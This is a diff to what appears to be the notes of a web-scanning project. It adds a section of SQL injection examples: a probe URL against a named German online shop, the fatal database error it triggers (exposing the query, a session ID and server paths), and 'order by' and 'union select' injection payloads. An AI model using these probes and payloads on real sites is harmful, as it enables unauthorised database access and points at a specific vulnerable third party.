@@ -118,3 +118,25 @@ aiohttp.client_exceptions.ClientOSError: Cannot write to closing transport
 Initiator пока не реализован.
 
 https://github.com/microsoft/playwright/issues/16326
+
+### SQL Errors Examples
+
+`https://shop.roeder-feuerwerk.de/?eventchanger=2%27%22`
+
+```
+<br>
+<b>Fatal error</b>:  Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '"' WHERE sessionID = 'im0fjag9sqck1hdefmj8fk568s'' at line 1 in /var/www/clients/client1/web4/web/engine/Library/Zend/Db/Adapter/Pdo/Abstract.php:256
+Stack trace:
+#0 /var/www/clients/client1/web4/web/engine/Library/Zend/Db/Adapter/Pdo/Abstract.php(256): PDO-&gt;exec()
+#1 /var/www/clients/client1/web4/web/custom/plugins/MofaEventShopping/Subscriber/Frontend/Frontend.php(172): Zend_Db_Adapter_Pdo_Abstract-&gt;exec()
+#2 /var/www/clients/client1/web4/web/engine/Library/Enlight/Event/Handler/Default.php(90): MofaEventShopping\Subscriber\Frontend\Frontend-&gt;onFrontendPostDispatch()
+#3 /var/www/clients/client1/web4/web/engine/Library/Enlight/Event/EventManager.php(207): Enlight_Event_Handler_Default-&gt;execute()
+#4 /var/www/clients/client1/web4/web/engine/Library/Enlight/Controller/Action.php(223): Enlight_Event_ in <b>/var/www/clients/client1/web4/web/engine/Library/Zend/Db/Adapter/Pdo/Abstract.php</b> on line <b>271</b><br>
+```
+
+```
+order by 1..20,10,40,30
+handler.php?id=-1+union+select+1,2,3,4,5,6,7,8,9,10,11
+```
+
+https://gist.github.com/s3rgeym/70d968ac28b07ddce1515dc1a403521f
